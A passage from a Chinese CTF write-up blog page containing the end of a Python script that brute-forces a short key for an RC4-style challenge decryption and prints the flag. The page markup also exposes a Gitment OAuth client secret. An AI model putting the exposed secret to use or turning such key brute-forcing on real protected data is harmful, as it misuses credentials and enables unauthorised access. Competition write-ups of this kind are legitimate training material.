= <span class="string">'123456789'</span></span><br><span class="line">    key = md5(UC_KEY.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    keya = md5(key[<span class="number">0</span>:<span class="number">16</span>].encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    keyb = md5(key[<span class="number">16</span>:<span class="number">32</span>].encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    cryptkey = md5((keya + keyc).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    key_length = len(cryptkey)</span><br><span class="line">    box = range(<span class="number">256</span>)</span><br><span class="line">    rndkey = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        rndkey[i] = ord(cryptkey[i % key_length])</span><br><span class="line">    string_length = <span class="number">49</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + box[i] + rndkey[i]) % <span class="number">256</span></span><br><span class="line">        tmp = box[i]</span><br><span class="line">        box[i] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line"></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(string_length):</span><br><span class="line">        a = (a + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[a]) % <span class="number">256</span></span><br><span class="line">        tmp = box[a]</span><br><span class="line">        box[a] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line">        result += chr(string[i] ^ box[(box[a] + box[j]) % <span class="number">256</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    d = [</span><br><span class="line">        <span class="number">128</span>,</span><br><span class="line">        <span class="number">220</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">113</span>,</span><br><span class="line">        <span class="number">242</span>,</span><br><span class="line">        <span class="number">153</span>,</span><br><span class="line">        <span class="number">181</span>,</span><br><span class="line">        <span class="number">203</span>,</span><br><span class="line">        <span class="number">21</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        <span class="number">101</span>,</span><br><span class="line">        <span class="number">42</span>,</span><br><span class="line">        <span class="number">55</span>,</span><br><span class="line">        <span class="number">56</span>,</span><br><span class="line">        <span class="number">19</span>,</span><br><span class="line">        <span class="number">190</span>,</span><br><span class="line">        <span class="number">181</span>,</span><br><span class="line">        <span class="number">99</span>,</span><br><span class="line">        <span class="number">47</span>,</span><br><span class="line">        <span class="number">217</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">129</span>,</span><br><span class="line">        <span class="number">221</span>,</span><br><span class="line">        <span class="number">9</span>,</span><br><span class="line">        <span class="number">65</span>,</span><br><span class="line">        <span class="number">235</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">197</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">123</span>,</span><br><span class="line">        <span class="number">86</span>,</span><br><span class="line">        <span class="number">25</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">172</span>,</span><br><span class="line">        <span class="number">175</span>,</span><br><span class="line">        <span class="number">42</span>,</span><br><span class="line">        <span class="number">168</span>,</span><br><span class="line">        <span class="number">232</span>,</span><br><span class="line">        <span class="number">81</span>,</span><br><span class="line">        <span class="number">224</span>,</span><br><span class="line">        <span class="number">170</span>,</span><br><span class="line">        <span class="number">16</span>,</span><br><span class="line">        <span class="number">210</span>,</span><br><span class="line">        <span class="number">98</span>,</span><br><span class="line">        <span class="number">229</span>,</span><br><span class="line">        <span class="number">15</span>,</span><br><span class="line">        <span class="number">30</span>,</span><br><span class="line">        <span class="number">134</span>]</span><br><span class="line">    <span class="keyword">for</span> x1 <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        <span class="keyword">for</span> x2 <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">            <span class="keyword">for</span> x3 <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">                <span class="keyword">for</span> x4 <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">                    keyc=x1+x2+x3+x4</span><br><span class="line">                    res = encodestr(d,keyc)</span><br><span class="line">                    flagbool = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        <span class="keyword">if</span> ord(i)&gt;<span class="number">128</span> <span class="keyword">or</span> ord(i)&lt;<span class="number">20</span>:</span><br><span class="line">                            flagbool=<span class="number">0</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> flagbool:</span><br><span class="line">                        <span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p>
<p>运行后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;$h0w_m3_7he_m0ney&#125;</span><br></pre></td></tr></table></figure></p>

    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者: <a href="http://skysec.top">一叶飘零</a>
            <p>原文链接: <a href="http://skysec.top/2018/05/12/2018年第四届全国网络空间安全技术大赛/">http://skysec.top/2018/05/12/2018年第四届全国网络空间安全技术大赛/</a>
            <p>发表日期: <a href="http://skysec.top/2018/05/12/2018年第四届全国网络空间安全技术大赛/">May 12th 2018, 10:44:02 am</a>
            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/2018/05/19/2018CUMTCTF-Final-Web/" title= 2018CUMTCTF-Final-Web >
                    <div class="nextTitle">2018CUMTCTF-Final-Web</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/2018/05/01/2018-RedHat-Web-Misc/" title= 2018-RedHat-Web_Misc >
                    <div class="prevTitle">2018-RedHat-Web_Misc</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
<div id="container"></div>
<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
<script>
    var gitment = new Gitment({
        id: "Sat May 12 2018 10:44:02 GMT+0800", // 可选。默认为 location.href
        owner: 'skyofkinglove',
        repo: 'sky.github.io',
        oauth: {
            client_id: 'b7f45cf046d0fdec25c4',
            client_secret: 'be2f9a33bd720bf5723cb6b7b23bd8dae88d7315',
        },
    })
    gitment.render('container')

</script>

    <!--PC和WAP自适应版-->

    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:skysec@aliyun.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/skyofkinglove" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
    
     
    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
    
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web签到"><span class="toc-number">2.1.</span> <span class="toc-text">web签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web1"><span class="toc-number">2.2.</span> <span class="toc-text">web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web2"><span class="toc-number">2.3.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web3"><span class="toc-number">2.4.</span> <span class="toc-text">web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web4"><span class="toc-number">2.5.</span> <span class="toc-text">web4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#misc1"><span class="toc-number">3.1.</span> <span class="toc-text">misc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc2"><span class="toc-number">3.2.</span> <span class="toc-text">misc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc3"><span class="toc-number">3.3.</span> <span class="toc-text">misc3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto1"><span class="toc-number">4.1.</span> <span class="toc-text">crypto1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto2"><span class="toc-number">4.2.</span> <span class="toc-text">crypto2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto3"><span class="toc-number">4.3.</span> <span class="toc-text">crypto3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto4"><span class="toc-number">4.4.</span> <span class="toc-text">crypto4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-number">5.</span> <span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#re1"><span class="toc-number">5.1.</span> <span class="toc-text">re1</span></a></li></ol></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 120
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2018 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/14</span><a class="archive-post-title" href= "/2018/07/14/configs/sorts/" >[Untitled Post]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/14</span><a class="archive-post-title" href= "/2018/07/14/软件安全复习总结/" >软件安全复习总结</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2018/07/13/网络管理复习/" >网络管理复习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/29</span><a class="archive-post-title" href= "/2018/06/29/安全协议考试重点/" >安全协议考试重点</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2018/06/20/DC0531-web/" >DC0531-web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/13</span><a class="archive-post-title" href= "/2018/06/13/保研机试C++算法复习/" >保研机试C++算法复习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/05</span><a class="archive-post-title" href= "/2018/06/05/Network-Management-Review/" >Network Management Review</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/04</span><a class="archive-post-title" href= "/2018/06/04/Secure-Protocol-Review/" >Secure Protocol Review</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/2018/06/03/2018-6-1信息安全铁人三项赛数据赛题解/" >2018.6.1信息安全铁人三项赛数据赛题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/2018.5.18信息安全铁人三项赛数据赛题解/" >2018.5.18信息安全铁人三项赛数据赛题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" >2018.5.5信息安全铁人三项赛数据赛题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2018/05/27/2018RedHat-AD-Web/" >2018RedHat-AD-Web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/19</span><a class="archive-post-title" href= "/2018/05/19/Json-Web-Token历险记/" >Json Web Token历险记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/19</span><a class="archive-post-title" href= "/2018/05/19/2018CUMTCTF-Final-Web/" >2018CUMTCTF-Final-Web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2018/05/12/2018年第四届全国网络空间安全技术大赛/" >2018年第四届全国网络空间安全技术大赛</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/01</span><a class="archive-post-title" href= "/2018/05/01/2018-RedHat-Web-Misc/" >2018-RedHat-Web_Misc</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/27</span><a class="archive-post-title" href= "/2018/04/27/线下AD-代码审计-ECShop-V2-7-3/" >线下AD&代码审计&ECShop V2.7.3</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDCTF-bitcoin-51per-Attack/" >DDCTF-bitcoin-51%Attack</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/流量分析-CTF题目实战/" >流量分析-CTF题目实战</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/数据分析-企业渗透过程/" >数据分析-企业渗透过程</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2018/04/16/2018-XCTF-HITB-PhpLover/" >2018-XCTF-HITB-PhpLover</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/15</span><a class="archive-post-title" href= "/2018/04/15/Long-Ago-AWD-Flasky/" >Long-Ago-AWD-Flasky</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2018/04/13/2018-XCTF-HITB-WEB/" >2018-XCTF-HITB-WEB</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2018/04/11/0ctf-ezdoor/" >0ctf-ezdoor</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2018/04/09/0ctf-login-me/" >0ctf-login me</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/pwnhub-time-injection带来的新思路/" >pwnhub time injection带来的新思路</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/amazing-phpinfo/" >amazing phpinfo()</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2018/04/01/Python-is-the-best-language/" >Python is the best language</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2018/03/23/从sql注入到xslt再到xxe的一道ctf题目/" >从sql注入到xslt再到xxe的一道ctf题目</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2018/03/21/从一道题深入mysql字符集与比对方法collation/" >从一道题深入mysql字符集与比对方法collation</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/solveme-peng-kr-web/" >solveme.peng.kr-web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/Some trick in ssrf and unserialize()/" >Some trick in ssrf and unserialize()</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2018/03/12/N1CTF-2018-Web/" >N1CTF 2018-Web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/09</span><a class="archive-post-title" href= "/2018/03/09/php-command or code-injection-summary/" >php-command/code-injection summary</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/05</span><a class="archive-post-title" href= "/2018/03/05/2018安全客元宵节小礼品趣味题/" >2018安全客元宵节小礼品趣味题</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/RingZer0-web-sql系列记录/" >RingZer0-web-sql系列记录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/2018安恒杯2月月赛web题解/" >2018安恒杯2月月赛web题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/25</span><a class="archive-post-title" href= "/2018/02/25/hgame-week4-web/" >hgame-week4-web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/21</span><a class="archive-post-title" href= "/2018/02/21/week3-hgame之web粗略记录/" >week3-hgame之web粗略记录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/13</span><a class="archive-post-title" href= "/2018/02/13/happymoctf之web全题解/" >happymoctf之web全题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/02</span><a class="archive-post-title" href= "/2018/02/02/skysql之union绕waf/" >skysql之union绕waf</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/01</span><a class="archive-post-title" href= "/2018/02/01/HITCTF-WEB题解/" >HITCTF-WEB题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/31</span><a class="archive-post-title" href= "/2018/01/31/moctf-Web题解/" >moctf-Web题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2018/01/22/2018安恒一月月赛部分题解/" >2018安恒一月月赛部分题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2018/01/18/XCTF-赛博地球杯工业互联网安全大赛web部分题解/" >XCTF-赛博地球杯工业互联网安全大赛web部分题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/07</span><a class="archive-post-title" href= "/2018/01/07/hackme网站边做边记录/" >hackme网站边做边记录</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2017 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/29</span><a class="archive-post-title" href= "/2017/12/29/Time-Based-RCE/" >Time_Based_RCE</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/29</span><a class="archive-post-title" href= "/2017/12/29/cms小白审计-typecho反序列漏洞/" >cms小白审计-typecho反序列漏洞</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/25</span><a class="archive-post-title" href= "/2017/12/25/一道有关密钥编排的DES题目/" >一道有关密钥编排的DES题目</a>
        </li>
    
    
        <li class="archive-post-item">
